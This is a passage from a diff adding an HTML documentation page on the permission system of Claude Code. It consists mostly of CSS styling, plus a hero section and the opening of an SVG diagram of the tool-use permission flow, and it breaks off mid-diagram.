@@ -1,0 +1,1946 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Permission System — Claude Code Architecture</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <style>
+    /* =====================================================================
+       Hero
+       ===================================================================== */
+    .hero {
+      padding: var(--space-16) 0 var(--space-12);
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 80% 50% at 50% -10%, rgba(248,81,73,0.08) 0%, transparent 70%),
+        radial-gradient(ellipse 40% 30% at 15% 60%, rgba(88,166,255,0.06) 0%, transparent 60%),
+        radial-gradient(ellipse 40% 30% at 85% 60%, rgba(188,140,255,0.05) 0%, transparent 60%);
+      pointer-events: none;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: var(--space-2);
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent-red);
+      background: rgba(248,81,73,0.08);
+      border: 1px solid rgba(248,81,73,0.2);
+      border-radius: var(--radius-full);
+      padding: var(--space-1) var(--space-3);
+      margin-bottom: var(--space-5);
+    }
+
+    .hero-eyebrow-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent-red);
+      animation: pulseDot 2s ease-in-out infinite;
+    }
+
+    @keyframes pulseDot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
+    }
+
+    .hero-title {
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      font-weight: var(--font-bold);
+      line-height: var(--leading-tight);
+      color: var(--text-primary);
+      margin-bottom: var(--space-4);
+      letter-spacing: -0.02em;
+    }
+
+    .hero-title-accent {
+      background: linear-gradient(135deg, var(--accent-red) 0%, var(--accent-orange) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .hero-subtitle {
+      font-size: var(--text-lg);
+      color: var(--text-secondary);
+      max-width: 580px;
+      margin: 0 auto var(--space-8);
+      line-height: var(--leading-relaxed);
+    }
+
+    .hero-diagram-wrap {
+      position: relative;
+      max-width: 900px;
+      margin: 0 auto;
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      padding: var(--space-8) var(--space-6);
+      box-shadow: var(--shadow-xl), inset 0 1px 0 rgba(255,255,255,0.04);
+      overflow: hidden;
+    }
+
+    .hero-diagram-wrap::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent-red), var(--accent-orange), transparent);
+      opacity: 0.5;
+    }
+
+    /* =====================================================================
+       Sections
+       ===================================================================== */
+    .page-section {
+      padding: var(--space-16) 0;
+    }
+
+    .page-section + .page-section {
+      border-top: 1px solid var(--border);
+    }
+
+    .section-header {
+      margin-bottom: var(--space-10);
+    }
+
+    .section-label {
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+      margin-bottom: var(--space-3);
+    }
+
+    .section-title {
+      font-size: var(--text-3xl);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+      letter-spacing: -0.02em;
+      margin-bottom: var(--space-3);
+    }
+
+    .section-desc {
+      font-size: var(--text-base);
+      color: var(--text-secondary);
+      max-width: 600px;
+      line-height: var(--leading-relaxed);
+    }
+
+    /* =====================================================================
+       Hero SVG Animation
+       ===================================================================== */
+    .hero-svg-node {
+      opacity: 0;
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      transform: translateY(8px);
+    }
+    .hero-svg-node.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .hero-svg-arrow {
+      opacity: 0;
+      stroke-dasharray: 8 5;
+      stroke-dashoffset: 100;
+      transition: opacity 0.3s ease, stroke-dashoffset 1.2s linear;
+    }
+    .hero-svg-arrow.visible {
+      opacity: 1;
+      stroke-dashoffset: 0;
+    }
+
+    @keyframes dashFlow {
+      to { stroke-dashoffset: -100; }
+    }
+    .arrow-flowing {
+      animation: dashFlow 2s linear infinite;
+    }
+
+    /* =====================================================================
+       Permission Mode Grid
+       ===================================================================== */
+    .mode-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: var(--space-4);
+    }
+
+    .mode-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-5);
+      position: relative;
+      cursor: default;
+      transition: border-color var(--transition), box-shadow var(--transition), transform var(--transition);
+      overflow: hidden;
+    }
+
+    .mode-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      transition: opacity var(--transition);
+      border-radius: inherit;
+    }
+
+    .mode-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .mode-card-default::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(88,166,255,0.08), transparent); }
+    .mode-card-acceptEdits::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(63,185,80,0.08), transparent); }
+    .mode-card-bypass::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(248,81,73,0.08), transparent); }
+    .mode-card-dontAsk::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(210,153,34,0.08), transparent); }
+    .mode-card-plan::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(57,210,192,0.08), transparent); }
+    .mode-card-auto::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(188,140,255,0.08), transparent); }
+    .mode-card-bubble::before { background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(139,148,158,0.08), transparent); }
+
+    .mode-card:hover::before { opacity: 1; }
+    .mode-card-default:hover  { border-color: rgba(88,166,255,0.35);  box-shadow: var(--glow-blue); }
+    .mode-card-acceptEdits:hover { border-color: rgba(63,185,80,0.35); box-shadow: var(--glow-green); }
+    .mode-card-bypass:hover   { border-color: rgba(248,81,73,0.35);   box-shadow: 0 0 20px rgba(248,81,73,0.2); }
+    .mode-card-dontAsk:hover  { border-color: rgba(210,153,34,0.35);  box-shadow: 0 0 20px rgba(210,153,34,0.2); }
+    .mode-card-plan:hover     { border-color: rgba(57,210,192,0.35);  box-shadow: var(--glow-cyan); }
+    .mode-card-auto:hover     { border-color: rgba(188,140,255,0.35); box-shadow: var(--glow-purple); }
+    .mode-card-bubble:hover   { border-color: rgba(139,148,158,0.3);  }
+
+    .mode-card-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      margin-bottom: var(--space-3);
+      position: relative;
+      z-index: 1;
+    }
+    .icon-default     { background: rgba(88,166,255,0.12); }
+    .icon-acceptEdits { background: rgba(63,185,80,0.12); }
+    .icon-bypass      { background: rgba(248,81,73,0.12); }
+    .icon-dontAsk     { background: rgba(210,153,34,0.12); }
+    .icon-plan        { background: rgba(57,210,192,0.12); }
+    .icon-auto        { background: rgba(188,140,255,0.12); }
+    .icon-bubble      { background: rgba(139,148,158,0.08); }
+
+    .mode-card-name {
+      font-size: var(--text-base);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+      font-family: var(--font-mono);
+      margin-bottom: var(--space-2);
+      position: relative;
+      z-index: 1;
+    }
+
+    .mode-card-desc {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+      margin-bottom: var(--space-3);
+      position: relative;
+      z-index: 1;
+    }
+
+    .mode-behavior-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: var(--space-1);
+      padding: 2px 10px;
+      border-radius: var(--radius-full);
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      border: 1px solid;
+      position: relative;
+      z-index: 1;
+    }
+    .tag-blue   { background: rgba(88,166,255,0.1);  color: var(--accent-blue);   border-color: rgba(88,166,255,0.25); }
+    .tag-green  { background: rgba(63,185,80,0.1);   color: var(--accent-green);  border-color: rgba(63,185,80,0.25); }
+    .tag-red    { background: rgba(248,81,73,0.1);   color: var(--accent-red);    border-color: rgba(248,81,73,0.25); }
+    .tag-orange { background: rgba(210,153,34,0.1);  color: var(--accent-orange); border-color: rgba(210,153,34,0.25); }
+    .tag-cyan   { background: rgba(57,210,192,0.1);  color: var(--accent-cyan);   border-color: rgba(57,210,192,0.25); }
+    .tag-purple { background: rgba(188,140,255,0.1); color: var(--accent-purple); border-color: rgba(188,140,255,0.25); }
+    .tag-gray   { background: rgba(139,148,158,0.08); color: var(--text-secondary); border-color: rgba(139,148,158,0.2); }
+
+    .mode-internal-badge {
+      position: absolute;
+      top: var(--space-3);
+      right: var(--space-3);
+      font-size: 10px;
+      font-weight: var(--font-semibold);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+      background: var(--bg-tertiary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 1px 6px;
+    }
+
+    /* =====================================================================
+       Permission Decision Flow
+       ===================================================================== */
+    .flow-container {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      overflow: hidden;
+    }
+
+    .flow-phase-header {
+      padding: var(--space-4) var(--space-6);
+      background: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+    }
+
+    .flow-phase-num {
+      font-size: var(--text-xs);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .phase-num-1 { background: rgba(248,81,73,0.15); color: var(--accent-red); border: 1px solid rgba(248,81,73,0.3); }
+    .phase-num-2 { background: rgba(63,185,80,0.15); color: var(--accent-green); border: 1px solid rgba(63,185,80,0.3); }
+    .phase-num-3 { background: rgba(88,166,255,0.15); color: var(--accent-blue); border: 1px solid rgba(88,166,255,0.3); }
+    .phase-num-post { background: rgba(188,140,255,0.15); color: var(--accent-purple); border: 1px solid rgba(188,140,255,0.3); }
+
+    .flow-phase-title {
+      font-size: var(--text-sm);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+    }
+
+    .flow-phase-subtitle {
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+      margin-left: auto;
+    }
+
+    .flow-steps {
+      padding: var(--space-4) var(--space-6);
+      display: flex;
+      flex-direction: column;
+      gap: var(--space-2);
+    }
+
+    .flow-step {
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      transition: border-color var(--transition);
+      cursor: pointer;
+    }
+
+    .flow-step:hover {
+      border-color: rgba(88,166,255,0.3);
+    }
+
+    .flow-step.step-active {
+      border-color: rgba(88,166,255,0.5);
+      box-shadow: 0 0 0 1px rgba(88,166,255,0.15);
+    }
+
+    .flow-step-header {
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+      padding: var(--space-3) var(--space-4);
+      background: var(--bg-primary);
+      user-select: none;
+    }
+
+    .flow-step-id {
+      font-size: var(--text-xs);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      color: var(--text-secondary);
+      min-width: 28px;
+    }
+
+    .flow-step-name {
+      font-size: var(--text-sm);
+      font-weight: var(--font-medium);
+      color: var(--text-primary);
+      flex: 1;
+    }
+
+    .flow-step-outcome {
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      padding: 2px 8px;
+      border-radius: var(--radius-full);
+    }
+    .outcome-deny   { background: rgba(248,81,73,0.12); color: var(--accent-red); border: 1px solid rgba(248,81,73,0.25); }
+    .outcome-ask    { background: rgba(210,153,34,0.12); color: var(--accent-orange); border: 1px solid rgba(210,153,34,0.25); }
+    .outcome-allow  { background: rgba(63,185,80,0.12); color: var(--accent-green); border: 1px solid rgba(63,185,80,0.25); }
+    .outcome-check  { background: rgba(88,166,255,0.12); color: var(--accent-blue); border: 1px solid rgba(88,166,255,0.25); }
+
+    .flow-step-chevron {
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+      transition: transform var(--transition);
+      flex-shrink: 0;
+    }
+    .flow-step.step-open .flow-step-chevron {
+      transform: rotate(90deg);
+    }
+
+    .flow-step-body {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .flow-step.step-open .flow-step-body {
+      max-height: 300px;
+    }
+
+    .flow-step-content {
+      padding: var(--space-4);
+      border-top: 1px solid var(--border);
+      background: var(--bg-secondary);
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+    }
+
+    .flow-step-content code {
+      font-size: var(--text-xs);
+    }
+
+    .flow-divider {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: var(--space-2) 0;
+      color: var(--text-secondary);
+      font-size: 12px;
+    }
+
+    .flow-divider-line {
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+      margin: 0 var(--space-3);
+    }
+
+    /* =====================================================================
+       YOLO Classifier
+       ===================================================================== */
+    .classifier-wrap {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      overflow: hidden;
+    }
+
+    .classifier-header {
+      padding: var(--space-5) var(--space-6);
+      background: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: var(--space-3);
+      flex-wrap: wrap;
+    }
+
+    .classifier-title-group {
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+    }
+
+    .classifier-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: var(--radius-md);
+      background: rgba(188,140,255,0.12);
+      border: 1px solid rgba(188,140,255,0.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+    }
+
+    .classifier-pipeline {
+      display: grid;
+      grid-template-columns: 1fr 40px 1fr 40px 1fr;
+      align-items: center;
+      gap: 0;
+      padding: var(--space-6);
+    }
+
+    @media (max-width: 768px) {
+      .classifier-pipeline {
+        grid-template-columns: 1fr;
+        gap: var(--space-3);
+      }
+      .classifier-arrow-col {
+        display: flex;
+        justify-content: center;
+        transform: rotate(90deg);
+      }
+    }
+
+    .classifier-node {
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-4);
+      text-align: center;
+      position: relative;
+    }
+
+    .classifier-node-icon {
+      font-size: 24px;
+      margin-bottom: var(--space-2);
+      display: block;
+    }
+
+    .classifier-node-title {
+      font-size: var(--text-sm);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+      margin-bottom: var(--space-1);
+    }
+
+    .classifier-node-desc {
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+    }
+
+    .classifier-arrow-col {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-secondary);
+      font-size: 20px;
+    }
+
+    .two-stage-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: var(--space-4);
+      padding: 0 var(--space-6) var(--space-6);
+    }
+
+    @media (max-width: 640px) {
+      .two-stage-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .stage-card {
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-5);
+    }
+
+    .stage-card-stage1 {
+      border-color: rgba(63,185,80,0.25);
+    }
+    .stage-card-stage2 {
+      border-color: rgba(188,140,255,0.25);
+    }
+
+    .stage-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: var(--space-1);
+      padding: 2px 10px;
+      border-radius: var(--radius-full);
+      font-size: var(--text-xs);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      margin-bottom: var(--space-3);
+    }
+    .stage-badge-1 { background: rgba(63,185,80,0.12); color: var(--accent-green); border: 1px solid rgba(63,185,80,0.25); }
+    .stage-badge-2 { background: rgba(188,140,255,0.12); color: var(--accent-purple); border: 1px solid rgba(188,140,255,0.25); }
+
+    .stage-title {
+      font-size: var(--text-base);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+      margin-bottom: var(--space-2);
+    }
+
+    .stage-detail {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+      margin-bottom: var(--space-3);
+    }
+
+    .stage-outcome-list {
+      display: flex;
+      flex-direction: column;
+      gap: var(--space-2);
+    }
+
+    .stage-outcome-item {
+      display: flex;
+      align-items: flex-start;
+      gap: var(--space-2);
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+    }
+
+    .stage-outcome-arrow {
+      font-size: 14px;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .denial-limits-bar {
+      display: flex;
+      align-items: center;
+      gap: var(--space-4);
+      padding: var(--space-4) var(--space-6);
+      background: rgba(248,81,73,0.04);
+      border-top: 1px solid rgba(248,81,73,0.15);
+      flex-wrap: wrap;
+    }
+
+    .denial-limit-item {
+      display: flex;
+      align-items: center;
+      gap: var(--space-2);
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+    }
+
+    .denial-counter {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      border-radius: var(--radius-md);
+      font-size: var(--text-base);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      background: rgba(248,81,73,0.12);
+      color: var(--accent-red);
+      border: 1px solid rgba(248,81,73,0.25);
+      flex-shrink: 0;
+    }
+
+    /* =====================================================================
+       Dangerous Patterns
+       ===================================================================== */
+    .patterns-wrap {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      overflow: hidden;
+    }
+
+    .patterns-table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .patterns-table th {
+      text-align: left;
+      padding: var(--space-3) var(--space-5);
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+      background: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .patterns-table td {
+      padding: var(--space-3) var(--space-5);
+      border-bottom: 1px solid rgba(48,54,61,0.5);
+      vertical-align: top;
+    }
+
+    .patterns-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .patterns-table tr:hover td {
+      background: rgba(48,54,61,0.3);
+    }
+
+    .pattern-code-cell {
+      font-family: var(--font-mono);
+      font-size: var(--text-sm);
+      color: var(--accent-cyan);
+    }
+
+    .pattern-desc-cell {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+    }
+
+    .cat-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 2px 8px;
+      border-radius: var(--radius-full);
+      font-size: 11px;
+      font-weight: var(--font-semibold);
+      border: 1px solid;
+      white-space: nowrap;
+    }
+    .cat-cross    { background: rgba(88,166,255,0.1);  color: var(--accent-blue);   border-color: rgba(88,166,255,0.25); }
+    .cat-bash     { background: rgba(210,153,34,0.1);  color: var(--accent-orange); border-color: rgba(210,153,34,0.25); }
+    .cat-internal { background: rgba(188,140,255,0.1); color: var(--accent-purple); border-color: rgba(188,140,255,0.25); }
+    .cat-cloud    { background: rgba(57,210,192,0.1);  color: var(--accent-cyan);   border-color: rgba(57,210,192,0.25); }
+
+    .patterns-note {
+      padding: var(--space-4) var(--space-5);
+      background: rgba(210,153,34,0.04);
+      border-top: 1px solid rgba(210,153,34,0.15);
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+    }
+
+    .patterns-note strong {
+      color: var(--accent-orange);
+    }
+
+    /* =====================================================================
+       Filesystem Safety
+       ===================================================================== */
+    .fs-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: var(--space-5);
+    }
+
+    @media (max-width: 640px) {
+      .fs-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .fs-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+    }
+
+    .fs-card-header {
+      display: flex;
+      align-items: center;
+      gap: var(--space-3);
+      padding: var(--space-4) var(--space-5);
+      background: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .fs-card-icon {
+      font-size: 18px;
+    }
+
+    .fs-card-title {
+      font-size: var(--text-sm);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+    }
+
+    .fs-card-count {
+      margin-left: auto;
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-full);
+      padding: 1px 8px;
+      font-family: var(--font-mono);
+    }
+
+    .fs-item-list {
+      padding: var(--space-3) var(--space-5);
+      display: flex;
+      flex-direction: column;
+      gap: var(--space-1);
+    }
+
+    .fs-item {
+      display: flex;
+      align-items: center;
+      gap: var(--space-2);
+      padding: var(--space-2) var(--space-3);
+      border-radius: var(--radius);
+      font-size: var(--text-sm);
+      font-family: var(--font-mono);
+      color: var(--accent-cyan);
+      background: rgba(57,210,192,0.04);
+      border: 1px solid rgba(57,210,192,0.1);
+      transition: background var(--transition), border-color var(--transition);
+    }
+
+    .fs-item:hover {
+      background: rgba(57,210,192,0.08);
+      border-color: rgba(57,210,192,0.2);
+    }
+
+    .fs-item-icon {
+      font-size: 12px;
+      flex-shrink: 0;
+    }
+
+    .fs-item-reason {
+      margin-left: auto;
+      font-size: 11px;
+      font-family: var(--font-sans);
+      color: var(--text-secondary);
+      font-style: italic;
+    }
+
+    .fs-defense-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: var(--space-4);
+      margin-top: var(--space-6);
+    }
+
+    .fs-defense-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-5);
+    }
+
+    .fs-defense-icon {
+      font-size: 24px;
+      margin-bottom: var(--space-3);
+      display: block;
+    }
+
+    .fs-defense-title {
+      font-size: var(--text-sm);
+      font-weight: var(--font-bold);
+      color: var(--text-primary);
+      margin-bottom: var(--space-2);
+    }
+
+    .fs-defense-desc {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+    }
+
+    /* =====================================================================
+       Key Insight Callout
+       ===================================================================== */
+    .insight-callout {
+      background: rgba(88,166,255,0.05);
+      border: 1px solid rgba(88,166,255,0.2);
+      border-left: 3px solid var(--accent-blue);
+      border-radius: 0 var(--radius-md) var(--radius-md) 0;
+      padding: var(--space-4) var(--space-5);
+      margin-top: var(--space-6);
+    }
+
+    .insight-callout-label {
+      font-size: var(--text-xs);
+      font-weight: var(--font-bold);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent-blue);
+      margin-bottom: var(--space-2);
+    }
+
+    .insight-callout p {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+      margin: 0;
+    }
+
+    .insight-callout p + p {
+      margin-top: var(--space-2);
+    }
+
+    /* =====================================================================
+       Rule Source Table
+       ===================================================================== */
+    .rule-source-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: var(--space-3);
+      margin-top: var(--space-5);
+    }
+
+    .rule-source-item {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: var(--space-4);
+      display: flex;
+      gap: var(--space-3);
+      align-items: flex-start;
+      transition: border-color var(--transition);
+    }
+
+    .rule-source-item:hover {
+      border-color: rgba(88,166,255,0.25);
+    }
+
+    .rule-source-num {
+      font-size: var(--text-xs);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      color: var(--text-secondary);
+      background: var(--bg-tertiary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      width: 22px;
+      height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .rule-source-body {}
+
+    .rule-source-name {
+      font-size: var(--text-sm);
+      font-weight: var(--font-bold);
+      font-family: var(--font-mono);
+      color: var(--accent-cyan);
+      margin-bottom: var(--space-1);
+    }
+
+    .rule-source-desc {
+      font-size: var(--text-xs);
+      color: var(--text-secondary);
+      line-height: var(--leading-relaxed);
+    }
+
+    /* =====================================================================
+       Nav Footer
+       ===================================================================== */
+    .nav-footer {
+      border-top: 1px solid var(--border);
+      padding: var(--space-6) 0;
+      margin-top: var(--space-8);
+    }
+
+    .nav-footer-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: var(--space-4);
+    }
+
+    .nav-footer-link {
+      display: inline-flex;
+      align-items: center;
+      gap: var(--space-2);
+      font-size: var(--text-sm);
+      font-weight: var(--font-medium);
+      color: var(--text-secondary);
+      text-decoration: none;
+      padding: var(--space-2) var(--space-4);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      transition: all var(--transition);
+    }
+
+    .nav-footer-link:hover {
+      color: var(--text-primary);
+      border-color: rgba(88,166,255,0.3);
+      background: rgba(88,166,255,0.05);
+      text-decoration: none;
+    }
+
+    .nav-footer-center {
+      font-size: var(--text-xs);
+      font-weight: var(--font-semibold);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      .nav-footer-center { display: none; }
+    }
+
+    /* =====================================================================
+       Site Footer
+       ===================================================================== */
+    .site-footer {
+      border-top: 1px solid var(--border);
+      padding: var(--space-6) 0;
+      margin-top: var(--space-4);
+    }
+
+    .site-footer-text {
+      font-size: var(--text-sm);
+      color: var(--text-secondary);
+      text-align: center;
+    }
+
+    /* =====================================================================
+       Reveal animation
+       ===================================================================== */
+    .reveal {
+      opacity: 0;
+      transform: translateY(16px);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+    }
+    .reveal.in-view {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+  </style>
+</head>
+<body>
+
+  <main>
+
+    <!-- =================================================================
+         Hero Section
+         ================================================================= -->
+    <section class="hero">
+      <div class="container">
+        <div class="hero-eyebrow">
+          <span class="hero-eyebrow-dot"></span>
+          Chapter 11 — Architecture Series
+        </div>
+
+        <h1 class="hero-title">
+          The <span class="hero-title-accent">Permission System</span>
+        </h1>
+
+        <p class="hero-subtitle">
+          Every tool use is evaluated by a layered security pipeline — deny rules, mode checks, safety
+          guards, and an optional AI classifier — before any action executes.
+        </p>
+
+        <!-- Hero SVG: Permission Decision Flow -->
+        <div class="hero-diagram-wrap" id="hero-diagram-wrap" aria-label="Permission decision flow diagram">
+          <svg viewBox="0 0 820 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;max-height:280px;" role="img" aria-label="Decision flow from tool_use through pipeline to outcomes">
+
+            <!-- Background grid dots -->
+            <defs>
+              <pattern id="dots" width="24" height="24" patternUnits="userSpaceOnUse">
+                <circle cx="1" cy="1" r="0.8" fill="rgba(139,148,158,0.15)"/>
+              </pattern>
+              <marker id="arrowhead" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L8,3 z" fill="rgba(139,148,158,0.6)"/>
+              </marker>
+              <marker id="arrowhead-blue" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L8,3 z" fill="#58a6ff"/>
+              </marker>
+              <marker id="arrowhead-red" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L8,3 z" fill="#f85149"/>
+              </marker>
+              <marker id="arrowhead-green" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L8,3 z" fill="#3fb950"/>
+              </marker>
+              <marker id="arrowhead-orange" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto">
+                <path d="M0,0 L0,6 L8,3 z" fill="#d29922"/>
+              </marker>
+            </defs>
+
+            <rect width="820" height="280" fill="url(#dots)"/>
+
+            <!-- Node: tool_use -->
+            <g id="node-tooluse" class="hero-svg-node">
+              <rect x="20" y="105" width="120" height="50" rx="8" fill="#21262d" stroke="#30363d" stroke-width="1.5"/>
+              <text x="80" y="124" fill="#8b949e" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600" letter-spacing="0.08em" text-transform="uppercase">MODEL EMITS</text>
+              <text x="80" y="142" fill="#e6edf3" font-size="12" font-family="monospace" text-anchor="middle" font-weight="700">tool_use</text>
+            </g>
+
+            <!-- Arrow: tool_use → outer wrapper -->
+            <path id="arrow-1" class="hero-svg-arrow" d="M140 130 L175 130" stroke="rgba(139,148,158,0.6)" stroke-width="1.5" fill="none" marker-end="url(#arrowhead)" stroke-dasharray="5 4"/>
+
+            <!-- Node: outer wrapper -->
+            <g id="node-outer" class="hero-svg-node">
+              <rect x="178" y="80" width="140" height="100" rx="8" fill="#21262d" stroke="#30363d" stroke-width="1.5"/>
+              <text x="248" y="104" fill="#8b949e" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600" letter-spacing="0.05em">OUTER WRAPPER</text>
+              <text x="248" y="120" fill="#e6edf3" font-size="10" font-family="monospace" text-anchor="middle" font-weight="600">hasPermissionsTo</text>
+              <text x="248" y="133" fill="#e6edf3" font-size="10" font-family="monospace" text-anchor="middle" font-weight="600">UseTool()</text>
